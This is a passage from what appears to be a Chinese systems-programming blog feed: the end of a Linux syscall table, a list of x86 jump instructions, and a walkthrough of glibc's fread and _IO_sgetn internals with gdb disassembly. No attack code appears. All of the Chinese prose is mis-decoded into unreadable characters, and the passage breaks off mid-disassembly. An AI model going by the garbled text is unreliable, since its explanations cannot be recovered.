href="http://www.kernel.org/doc/man-pages/online/pages/man2/waitid.2.html">compat_sys_waitid</a></td><td>0x17c</td><td>int</td><td>compat_pid_t</td><td>struct compat_siginfo __user *</td><td>int</td><td>struct compat_rusage __user *</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>381</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/set_robust_list.2.html">compat_sys_set_robust_list</a></td><td>0x17d</td><td>struct compat_robust_list_head __user *head</td><td>compat_size_t len</td><td>-</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>382</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/get_robust_list.2.html">compat_sys_get_robust_list</a></td><td>0x17e</td><td>int pid</td><td>compat_uptr_t __user *head_ptr</td><td>compat_size_t __user *len_ptr</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>383</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/vmsplice.2.html">sys_vmsplice</a></td><td>0x17f</td><td>int fd</td><td>const struct iovec __user *iov</td><td>unsigned long nr_segs</td><td>unsigned int flags</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/splice.c#L1292">fs&#x2F;splice.c:1292</a></td></tr><tr><td>384</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/move_pages.2.html">sys_move_pages</a></td><td>0x180</td><td>pid_t pid</td><td>unsigned long nr_pages</td><td>const void __user * __user *pages</td><td>const int __user *nodes</td><td>int __user *status</td><td>int flags</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/migrate.c#L2063">mm&#x2F;migrate.c:2063</a></td></tr><tr><td>385</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/preadv64.2.html">compat_sys_preadv64</a></td><td>0x181</td><td>unsigned long fd</td><td>const struct iovec __user *vec</td><td>unsigned long vlen</td><td>loff_t pos</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>386</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/pwritev64.2.html">compat_sys_pwritev64</a></td><td>0x182</td><td>unsigned long fd</td><td>const struct iovec __user *vec</td><td>unsigned long vlen</td><td>loff_t pos</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>387</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rt_tgsigqueueinfo.2.html">compat_sys_rt_tgsigqueueinfo</a></td><td>0x183</td><td>compat_pid_t tgid</td><td>compat_pid_t pid</td><td>int sig</td><td>struct compat_siginfo __user *uinfo</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>388</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/recvmmsg_time64.2.html">compat_sys_recvmmsg_time64</a></td><td>0x184</td><td>int fd</td><td>struct compat_mmsghdr __user *mmsg</td><td>unsigned vlen</td><td>unsigned int flags</td><td>struct __kernel_timespec __user *timeout</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>389</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sendmmsg.2.html">compat_sys_sendmmsg</a></td><td>0x185</td><td>int fd</td><td>struct compat_mmsghdr __user *mmsg</td><td>unsigned vlen</td><td>unsigned int flags</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>390</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/process_vm_readv.2.html">sys_process_vm_readv</a></td><td>0x186</td><td>pid_t pid</td><td>const struct iovec __user *lvec</td><td>unsigned long liovcnt</td><td>const struct iovec __user *rvec</td><td>unsigned long riovcnt</td><td>unsigned long flags</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/process_vm_access.c#L291">mm&#x2F;process_vm_access.c:291</a></td></tr><tr><td>391</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/process_vm_writev.2.html">sys_process_vm_writev</a></td><td>0x187</td><td>pid_t pid</td><td>const struct iovec __user *lvec</td><td>unsigned long liovcnt</td><td>const struct iovec __user *rvec</td><td>unsigned long riovcnt</td><td>unsigned long flags</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/process_vm_access.c#L298">mm&#x2F;process_vm_access.c:298</a></td></tr><tr><td>392</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setsockopt.2.html">sys_setsockopt</a></td><td>0x188</td><td>int fd</td><td>int level</td><td>int optname</td><td>char __user *optval</td><td>int optlen</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/net/socket.c#L2260">net&#x2F;socket.c:2260</a></td></tr><tr><td>393</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getsockopt.2.html">sys_getsockopt</a></td><td>0x189</td><td>int fd</td><td>int level</td><td>int optname</td><td>char __user *optval</td><td>int __user *optlen</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/net/socket.c#L2308">net&#x2F;socket.c:2308</a></td></tr><tr><td>394</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/io_setup.2.html">compat_sys_io_setup</a></td><td>0x18a</td><td>unsigned nr_reqs</td><td>u32 __user *ctx32p</td><td>-</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>395</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/io_submit.2.html">compat_sys_io_submit</a></td><td>0x18b</td><td>compat_aio_context_t ctx_id</td><td>int nr</td><td>u32 __user *iocb</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>396</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/execveat.2.html">compat_sys_execveat</a></td><td>0x18c</td><td>int dfd</td><td>const char __user *filename</td><td>const compat_uptr_t __user *argv</td><td>const compat_uptr_t __user *envp</td><td>int flags</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>397</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/preadv64v2.2.html">compat_sys_preadv64v2</a></td><td>0x18d</td><td>unsigned long fd</td><td>const struct iovec __user *vec</td><td>unsigned long vlen</td><td>loff_t pos</td><td>rwf_t flags</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>398</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/pwritev64v2.2.html">compat_sys_pwritev64v2</a></td><td>0x18e</td><td>unsigned long fd</td><td>const struct iovec __user *vec</td><td>unsigned long vlen</td><td>loff_t pos</td><td>rwf_t flags</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr></tbody></table>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>è·³è½¬æŒ‡ä»¤æ±‡æ€»</title>
    <link href="/2023/03/20/%E8%B7%B3%E8%BD%AC%E6%8C%87%E4%BB%A4%E6%B1%87%E6%80%BB/"/>
    <url>/2023/03/20/%E8%B7%B3%E8%BD%AC%E6%8C%87%E4%BB%A4%E6%B1%87%E6%80%BB/</url>
    
    <content type="html"><![CDATA[<h2 id="æ— æ¡ä»¶è·³è½¬"><a href="#æ— æ¡ä»¶è·³è½¬" class="headerlink" title="æ— æ¡ä»¶è·³è½¬"></a>æ— æ¡ä»¶è·³è½¬</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">JMP ;æ— æ¡ä»¶è·³è½¬<br></code></pre></td></tr></table></figure><h2 id="æ ¹æ®CXã€ECXå¯„å­˜å™¨çš„å€¼è·³è½¬"><a href="#æ ¹æ®CXã€ECXå¯„å­˜å™¨çš„å€¼è·³è½¬" class="headerlink" title="æ ¹æ®CXã€ECXå¯„å­˜å™¨çš„å€¼è·³è½¬"></a>æ ¹æ®CXã€ECXå¯„å­˜å™¨çš„å€¼è·³è½¬</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">JCXZ ;CX ä¸º 0 åˆ™è·³è½¬<br>JECXZ;ECX ä¸º 0 åˆ™è·³è½¬<br></code></pre></td></tr></table></figure><h2 id="æ ¹æ®æ ‡å¿—ä½è·³è½¬çš„æŒ‡ä»¤"><a href="#æ ¹æ®æ ‡å¿—ä½è·³è½¬çš„æŒ‡ä»¤" class="headerlink" title="æ ¹æ®æ ‡å¿—ä½è·³è½¬çš„æŒ‡ä»¤"></a>æ ¹æ®æ ‡å¿—ä½è·³è½¬çš„æŒ‡ä»¤</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs assembly">JE ;ç­‰äºåˆ™è·³è½¬åŒJZJNE ;ä¸ç­‰äºåˆ™è·³è½¬åŒJNZ<br>JNE ;ä¸ç­‰äºåˆ™è·³è½¬<br>JA   ;æ— ç¬¦å·å¤§äºåˆ™è·³è½¬<br>JNA  ;æ— ç¬¦å·ä¸å¤§äºåˆ™è·³è½¬<br>JAE  ;æ— ç¬¦å·å¤§äºç­‰äºåˆ™è·³è½¬åŒJNB<br>JNAE ;æ— ç¬¦å·ä¸å¤§äºç­‰äºåˆ™è·³è½¬åŒJB<br>JB   ;æ— ç¬¦å·å°äºåˆ™è·³è½¬<br>JNB  ;æ— ç¬¦å·ä¸å°äºåˆ™è·³è½¬<br>JBE  ;æ— ç¬¦å·å°äºç­‰äºåˆ™è·³è½¬åŒJNA<br>JNBE ;æ— ç¬¦å·ä¸å°äºç­‰äºåˆ™è·³è½¬åŒJA<br>JG   ;æœ‰ç¬¦å·å¤§äºåˆ™è·³è½¬<br>JNG  ;æœ‰ç¬¦å·ä¸å¤§äºåˆ™è·³è½¬<br>JGE  ;æœ‰ç¬¦å·å¤§äºç­‰äºåˆ™è·³è½¬åŒJNL<br>JNGE ;æœ‰ç¬¦å·ä¸å¤§äºç­‰äºåˆ™è·³è½¬åŒJL<br>JL   ;æœ‰ç¬¦å·å°äºåˆ™è·³è½¬<br>JNL  ;æœ‰ç¬¦å·ä¸å°äºåˆ™è·³è½¬<br>JLE  ;æœ‰ç¬¦å·å°äºç­‰äºåˆ™è·³è½¬åŒJNG<br>JNLE ;æœ‰ç¬¦å·ä¸å°äºç­‰äºåˆ™è·³è½¬åŒJG<br>JZ   ;ä¸ºé›¶åˆ™è·³è½¬<br>JNZ  ;ä¸ä¸ºé›¶åˆ™è·³è½¬<br>JS   ;ä¸ºè´Ÿåˆ™è·³è½¬<br>JNS  ;ä¸ä¸ºè´Ÿåˆ™è·³è½¬<br>JC   ;è¿›ä½åˆ™è·³è½¬<br>JNC  ;ä¸è¿›ä½åˆ™è·³è½¬<br>JO   ;æº¢å‡ºåˆ™è·³è½¬<br>JNO  ;ä¸æº¢å‡ºåˆ™è·³è½¬<br>JP;ä¸ºå¶åˆ™è·³è½¬<br>JNP  ;ä¸ä¸ºå¶åˆ™è·³è½¬<br>JPE  ;å¥‡å¶ä½ç½®ä½åˆ™è·³è½¬åŒJP<br>JPO  ;å¥‡å¶ä½å¤ä½åˆ™è·³è½¬åŒJNP<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€IO_FILEã€‘æºç è¯¦è§£-part2</title>
    <link href="/2022/12/07/%E3%80%90IO_FILE%E3%80%91%E6%BA%90%E7%A0%81%E8%AF%A6%E8%A7%A3-part2/"/>
    <url>/2022/12/07/%E3%80%90IO_FILE%E3%80%91%E6%BA%90%E7%A0%81%E8%AF%A6%E8%A7%A3-part2/</url>
    
    <content type="html"><![CDATA[<blockquote><p>åœ¨ä¸Šä¸€ç¯‡æ–‡ç« ä¸­ï¼Œä¸»è¦å¯¹IO_FILEç»“æ„ä½“ç›¸å…³ä»¥åŠfopenå‡½æ•°è¿›è¡Œäº†æ·±å…¥çš„ä»‹ç»ã€‚æœ¬æ–‡å°†ç»§ç»­ä»glibc2.36æºç å‡ºå‘ï¼Œä»‹ç»freadå‡½æ•°ç›¸å…³å†…å®¹</p></blockquote><h2 id="fread"><a href="#fread" class="headerlink" title="fread"></a>fread</h2><p>é¦–å…ˆæ˜¯ä¸€ä¸ªå®å®šä¹‰ï¼Œæ›¿æ¢ä¸º<code>_IO_fread</code>å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//htps://elixir.bootlin.com/glibc/latest/source/stdio-common/getw.c#L21</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> fread(p, m, n, s) _IO_fread (p, m, n, s)</span><br><br><span class="hljs-comment">// https://elixir.bootlin.com/glibc/latest/source/libio/iofread.c#L30</span><br><span class="hljs-type">size_t</span><br>_IO_fread (<span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> size, <span class="hljs-type">size_t</span> count, FILE *fp)<br>&#123;<br>  <span class="hljs-type">size_t</span> bytes_requested = size * count;<br>  <span class="hljs-type">size_t</span> bytes_read;<br>  CHECK_FILE (fp, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span> (bytes_requested == <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  _IO_acquire_lock (fp);<br>  bytes_read = _IO_sgetn (fp, (<span class="hljs-type">char</span> *) buf, bytes_requested);<br>  _IO_release_lock (fp);<br>  <span class="hljs-keyword">return</span> bytes_requested == bytes_read ? count : bytes_read / size;<br>&#125;<br>libc_hidden_def (_IO_fread)<br></code></pre></td></tr></table></figure><h2 id="CHECK-FILE"><a href="#CHECK-FILE" class="headerlink" title="CHECK_FILE"></a>CHECK_FILE</h2><p>é¦–å…ˆè¿›å…¥<code>CHECK_FILE</code>å¯¹<strong>fp</strong>è¿›è¡Œæ£€æŸ¥</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// https://elixir.bootlin.com/glibc/latest/source/libio/libioP.h#L866</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> IO_DEBUG</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> CHECK_FILE(FILE, RET) do &#123;\</span><br><span class="hljs-meta">    <span class="hljs-keyword">if</span> ((FILE) == NULL\</span><br><span class="hljs-meta">|| ((FILE)-&gt;_flags &amp; _IO_MAGIC_MASK) != _IO_MAGIC)\</span><br><span class="hljs-meta">      &#123;\</span><br><span class="hljs-meta">__set_errno (EINVAL);\</span><br><span class="hljs-meta">return RET;\</span><br><span class="hljs-meta">      &#125;\</span><br><span class="hljs-meta">  &#125; while (0)</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> CHECK_FILE(FILE, RET) do &#123; &#125; while (0)</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œæ”¾ç½®ä¸€ä¸‹æ‰€æœ‰ç”¨äºæ£€æµ‹flagçš„å®å®šä¹‰çš„å€¼,ç›®å‰å16ä½åªä½¿ç”¨äº†15ä¸ªï¼Œ0x4000è¿˜æœªè®¾å®š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// https://elixir.bootlin.com/glibc/latest/source/libio/libio.h#L67</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_MAGIC         0xFBAD0000 <span class="hljs-comment">/* Magic number */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_MAGIC_MASK    0xFFFF0000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_USER_BUF          0x0001 <span class="hljs-comment">/* Don&#x27;t deallocate buffer on close. */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_UNBUFFERED        0x0002</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_NO_READS          0x0004 <span class="hljs-comment">/* Reading not allowed.  */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_NO_WRITES         0x0008 <span class="hljs-comment">/* Writing not allowed.  */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_EOF_SEEN          0x0010</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_ERR_SEEN          0x0020</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_DELETE_DONT_CLOSE 0x0040 <span class="hljs-comment">/* Don&#x27;t call close(_fileno) on close.  */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_LINKED            0x0080 <span class="hljs-comment">/* In the list of all open files.  */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_IN_BACKUP         0x0100</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_LINE_BUF          0x0200</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_TIED_PUT_GET      0x0400 <span class="hljs-comment">/* Put and get pointer move in unison.  */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_CURRENTLY_PUTTING 0x0800</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_IS_APPENDING      0x1000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_IS_FILEBUF        0x2000</span><br>                           <span class="hljs-comment">/* 0x4000  No longer used, reserved for compat.  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_USER_LOCK         0x8000</span><br></code></pre></td></tr></table></figure><p>æ‰€ä»¥è¿™é‡Œçš„å‡½æ•°å°±æ˜¯æ£€æµ‹<code>(FILE)-&gt;_flags &amp; _IO_MAGIC_MASK) != _IO_MAGIC</code>å³ï¼Œé«˜ä½æ˜¯å¦ä¸º<strong>0xFBAD0000</strong>ã€‚ç„¶åä¼šè°ƒç”¨<code> _IO_acquire_lock</code>ï¼Œè¿™ä¸ªå®åŒæ ·æ˜¯å¯¹ç»“æ„ä½“è¿›è¡Œä¸€äº›å¤„ç†ï¼ŒåŸºæœ¬å¯ä»¥æ— è§†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// https://elixir.bootlin.com/glibc/latest/source/sysdeps/generic/stdio-lock.h#L51</span><br><span class="hljs-meta"># <span class="hljs-keyword">ifdef</span> __EXCEPTIONS</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> _IO_acquire_lock(_fp) \</span><br><span class="hljs-meta">  do &#123;      \</span><br><span class="hljs-meta">    FILE *_IO_acquire_lock_file      \</span><br><span class="hljs-meta">__attribute__((cleanup (_IO_acquire_lock_fct)))      \</span><br><span class="hljs-meta">= (_fp);      \</span><br><span class="hljs-meta">    _IO_flockfile (_IO_acquire_lock_file);</span><br><span class="hljs-meta"># <span class="hljs-keyword">else</span></span><br><span class="hljs-meta">#  <span class="hljs-keyword">define</span> _IO_acquire_lock(_fp) _IO_acquire_lock_needs_exceptions_enabled</span><br><span class="hljs-meta"># <span class="hljs-keyword">endif</span></span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> _IO_release_lock(_fp) ; &#125; while (0)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><h2 id="IO-sgetn"><a href="#IO-sgetn" class="headerlink" title="_IO_sgetn"></a>_IO_sgetn</h2><p>æ ¸å¿ƒéƒ¨åˆ†æ˜¯è¿™é‡Œçš„<code>_IO_sgetn</code>å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// https://elixir.bootlin.com/glibc/latest/source/libio/genops.c#L408</span><br><span class="hljs-type">size_t</span><br>_IO_sgetn (FILE *fp, <span class="hljs-type">void</span> *data, <span class="hljs-type">size_t</span> n)<br>&#123;<br>  <span class="hljs-comment">/* FIXME handle putback buffer here! */</span><br>  <span class="hljs-keyword">return</span> _IO_XSGETN (fp, data, n);<br>&#125;<br>libc_hidden_def (_IO_sgetn)<br><br><span class="hljs-comment">// https://elixir.bootlin.com/glibc/latest/source/libio/libioP.h#L182</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-title function_">size_t</span> <span class="hljs-params">(*_IO_xsgetn_t)</span> <span class="hljs-params">(FILE *FP, <span class="hljs-type">void</span> *DATA, <span class="hljs-type">size_t</span> N)</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_XSGETN(FP, DATA, N) JUMP2 (__xsgetn, FP, DATA, N)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_WXSGETN(FP, DATA, N) WJUMP2 (__xsgetn, FP, DATA, N)</span><br></code></pre></td></tr></table></figure><p>åœ¨æºç ä¸­è·Ÿè¸ªè¿™ä¸ªå®åˆ°è¿™é‡Œå°±æ–­äº†ï¼Œä¸ºæ‰¾å®é™…å‡½æ•°è°ƒç”¨ï¼Œæ‰€ä»¥æˆ‘å†™äº†ä¸€ä¸ªå®ä¾‹ä»£ç ç”¨äºgdbè·Ÿè¸ªã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br> <br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>   FILE *fp;<br>   <span class="hljs-type">char</span> c[] = <span class="hljs-string">&quot;This is runoob&quot;</span>;<br>   <span class="hljs-type">char</span> buffer[<span class="hljs-number">20</span>];<br>   fp = fopen(<span class="hljs-string">&quot;file.txt&quot;</span>, <span class="hljs-string">&quot;w+&quot;</span>);   <span class="hljs-comment">/* æ‰“å¼€æ–‡ä»¶ç”¨äºè¯»å†™ */</span><br>   fwrite(c, <span class="hljs-built_in">strlen</span>(c) + <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, fp);   <span class="hljs-comment">/* å†™å…¥æ•°æ®åˆ°æ–‡ä»¶ */</span><br>   fseek(fp, <span class="hljs-number">0</span>, SEEK_SET);   <span class="hljs-comment">/* æŸ¥æ‰¾æ–‡ä»¶çš„å¼€å¤´ */</span><br>   fread(buffer, <span class="hljs-built_in">strlen</span>(c)+<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, fp);   <span class="hljs-comment">/* è¯»å–å¹¶æ˜¾ç¤ºæ•°æ® */</span><br>   <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, buffer);<br>   fclose(fp);<br>   <span class="hljs-keyword">return</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬çœ‹ä¸€ä¸‹æ±‡ç¼–çš„<code>_IO_sgetn</code>å‡½æ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x7ffff7e0d050 &lt;__GI__IO_sgetn&gt;:     endbr64 <br>0x7ffff7e0d054 &lt;__GI__IO_sgetn+4&gt;:   push   rbx<br>0x7ffff7e0d055 &lt;__GI__IO_sgetn+5&gt;:   lea    rcx,[rip+0x1879a4]        # 0x7ffff7f94a00 &lt;_IO_helper_jumps&gt;<br>0x7ffff7e0d05c &lt;__GI__IO_sgetn+12&gt;:  lea    rax,[rip+0x188705]        # 0x7ffff7f95768<br>0x7ffff7e0d063 &lt;__GI__IO_sgetn+19&gt;:  sub    rax,rcx<br>0x7ffff7e0d066 &lt;__GI__IO_sgetn+22&gt;:  sub    rsp,0x20<br>0x7ffff7e0d06a &lt;__GI__IO_sgetn+26&gt;:  mov    rbx,QWORD PTR [rdi+0xd8]<br>0x7ffff7e0d071 &lt;__GI__IO_sgetn+33&gt;:  mov    r8,rbx<br>0x7ffff7e0d074 &lt;__GI__IO_sgetn+36&gt;:  sub    r8,rcx<br>0x7ffff7e0d077 &lt;__GI__IO_sgetn+39&gt;:  cmp    rax,r8<br>0x7ffff7e0d07a &lt;__GI__IO_sgetn+42&gt;:  jbe    0x7ffff7e0d090 &lt;__GI__IO_sgetn+64&gt;<br>0x7ffff7e0d07c &lt;__GI__IO_sgetn+44&gt;:  mov    rax,QWORD PTR [rbx+0x40]<br>0x7ffff7e0d080 &lt;__GI__IO_sgetn+48&gt;:  add    rsp,0x20<br>0x7ffff7e0d084 &lt;__GI__IO_sgetn+52&gt;:  pop    rbx<br>0x7ffff7e0d085 &lt;__GI__IO_sgetn+53&gt;:  jmp    rax<br>0x7ffff7e0d087 &lt;__GI__IO_sgetn+55&gt;:  nop    WORD PTR [rax+rax*1+0x0]<br>0x7ffff7e0d090 &lt;__GI__IO_sgetn+64&gt;:  mov    QWORD PTR [rsp+0x18],rdx<br>0x7ffff7e0d095 &lt;__GI__IO_sgetn+69&gt;:  mov    QWORD PTR 